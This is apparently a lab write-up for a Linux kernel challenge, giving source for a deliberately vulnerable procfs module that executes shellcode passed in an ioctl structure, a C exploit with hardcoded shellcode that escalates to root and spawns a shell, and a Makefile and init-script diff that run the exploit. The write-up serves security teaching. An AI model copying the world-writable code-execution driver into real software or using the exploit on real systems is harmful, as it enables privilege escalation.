#metadata(
  (
    title: "Procfs Ioctl Struct Challenge",
    description: "Documentation of a kernel challenge that executes shellcode passed via a structure in an ioctl call.",
    date: "2026-01-05",
    order: 13,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Procfs Ioctl Struct: Complex Data Interaction

This challenge combines `ioctl` with shellcode execution. Instead of passing a simple pointer or value, the exploit sends a custom C structure containing the shellcode. This is representative of how modern kernel drivers interact with complex user-space applications.

== The Driver Code

The module defines a `struct exploit_data` and uses `ioctl` to receive it. It then copies the shellcode from the structure into an executable kernel buffer.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/vmalloc.h>

#define PROC_FILENAME "pwn_struct_exec"
#define IOCTL_STRUCT_EXEC 0x1341

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fitrafep");
MODULE_DESCRIPTION("Ioctl Struct Shellcode Challenge");

struct exploit_data {
    char shellcode[256];
};

static struct proc_dir_entry *proc_entry;
static char *exec_buffer;

typedef void* (*vmalloc_node_range_t) (unsigned long size, unsigned long align,
			unsigned long start, unsigned long end, gfp_t gfp_mask,
			pgprot_t prot, unsigned long vm_flags, int node,
			const void *caller);

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct exploit_data data;

    if (cmd != IOCTL_STRUCT_EXEC)
        return -EINVAL;

    // Safely copy the entire structure from user-space
    if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
        return -EFAULT;

    printk(KERN_INFO "ioctl_struct_chall: Copying and executing shellcode from struct...\n");
    
    // Transfer shellcode to the executable kernel buffer
    memcpy(exec_buffer, data.shellcode, sizeof(data.shellcode));
    
    // Execute the shellcode
    ((void (*)(void))exec_buffer)();

    return 0;
}

#ifdef HAVE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_ioctl = device_ioctl,
};
#else
static const struct file_operations proc_fops = {
    .unlocked_ioctl = device_ioctl,
};
#endif

static int __init ioctl_struct_init(void)
{
    vmalloc_node_range_t my_vmalloc_node_range;

    my_vmalloc_node_range = (vmalloc_node_range_t)kallsyms_lookup_name("__vmalloc_node_range");
    if (!my_vmalloc_node_range)
        return -ENXIO;

    exec_buffer = my_vmalloc_node_range(PAGE_SIZE, 1, VMALLOC_START, VMALLOC_END,
                                       GFP_KERNEL, PAGE_KERNEL_EXEC, 0,
                                       NUMA_NO_NODE, __builtin_return_address(0));
    if (!exec_buffer)
        return -ENOMEM;

    proc_entry = proc_create(PROC_FILENAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        vfree(exec_buffer);
        return -ENOMEM;
    }
    return 0;
}

static void __exit ioctl_struct_exit(void)
{
    proc_remove(proc_entry);
    vfree(exec_buffer);
}

module_init(ioctl_struct_init);
module_exit(ioctl_struct_exit);
```

== Makefile

```makefile
obj-m += secret_chall.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

== Interacting with Structures

When the kernel receives a pointer to a structure in `ioctl`, it must copy the *entire* structure into kernel memory before accessing its members. 

```c
struct exploit_data data;
copy_from_user(&data, (void __user *)arg, sizeof(data));
```

This pattern is safer than accessing members individually via `get_user()` but introduces its own risks, such as **kernel stack overflows** if the structure is too large, or **uninitialized memory leaks** if the kernel-side structure is not properly cleared before being sent back to user-space.

== Exploit Script (C)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define IOCTL_STRUCT_EXEC 0x1341

struct exploit_data {
    char shellcode[256];
};

unsigned char sc[] = {
    0x48, 0x31, 0xff,
    0x48, 0xb8, 0x60, 0x96, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xd0,
    0x48, 0x89, 0xc7,
    0x48, 0xb8, 0x10, 0x93, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xd0,
    0xc3
};

int main() {
    // 1. Open the proc entry
    int fd = open("/proc/pwn_struct_exec", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // 2. Prepare the data structure with shellcode
    struct exploit_data data;
    memset(&data, 0, sizeof(data));
    memcpy(data.shellcode, sc, sizeof(sc));

    // 3. Trigger execution via ioctl
    if (ioctl(fd, IOCTL_STRUCT_EXEC, &data) < 0) {
        perror("ioctl");
        return 1;
    }

    // 4. Verify root escalation
    if (getuid() == 0) {
        printf("[+] Success! We are root.\n");
        system("/bin/sh");
    } else {
        printf("[-] Failed to get root.\n");
    }

    close(fd);
    return 0;
}
```

== Deployment

Modify the `rootfs/init` script to load the module and trigger the exploit:

```diff
-exec /bin/sh
+insmod /secret_chall.ko
+su pwn -c "/exploit_secret"
+poweroff -f
```
